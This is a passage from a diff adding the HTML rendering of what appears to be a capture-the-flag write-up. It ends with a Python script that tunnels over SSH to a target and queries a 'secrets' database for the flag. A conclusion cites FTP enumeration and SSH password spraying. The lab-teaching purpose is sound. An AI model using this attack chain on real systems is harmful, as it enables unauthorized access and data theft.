+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="k">def</span><span class="w"> </span><span class="nf">ssh_tunnel</span><span class="p">():</span>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>    <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ssh -L </span><span class="si">{</span><span class="n">LOCAL_PORT</span><span class="si">}</span><span class="s2">:localhost:</span><span class="si">{</span><span class="n">REMOTE_PORT</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s2">@</span><span class="si">{</span><span class="n">TARGET_IP</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="k">def</span><span class="w"> </span><span class="nf">fetch_flag</span><span class="p">():</span>
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>    <span class="n">conn</span> <span class="o">=</span> <span class="n">psycopg2</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">dbname</span><span class="o">=</span><span class="s2">&quot;secrets&quot;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">PASSWORD</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">LOCAL_PORT</span><span class="p">)</span>
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>    <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>    <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM flag;&quot;</span><span class="p">)</span>
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[FLAG]:&quot;</span><span class="p">,</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span>
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="n">ftp_download</span><span class="p">()</span>
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="n">ssh_tunnel</span><span class="p">()</span>
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="n">fetch_flag</span><span class="p">()</span>
+</code></pre></div>
+<hr />
+<h2 id="conclusion"><strong>Conclusion</strong></h2>
+<p>By leveraging <strong>FTP enumeration, SSH password spraying, local service discovery, and port forwarding</strong>, we successfully retrieved the flag from the <code>secrets</code> database.</p>
 
 
 
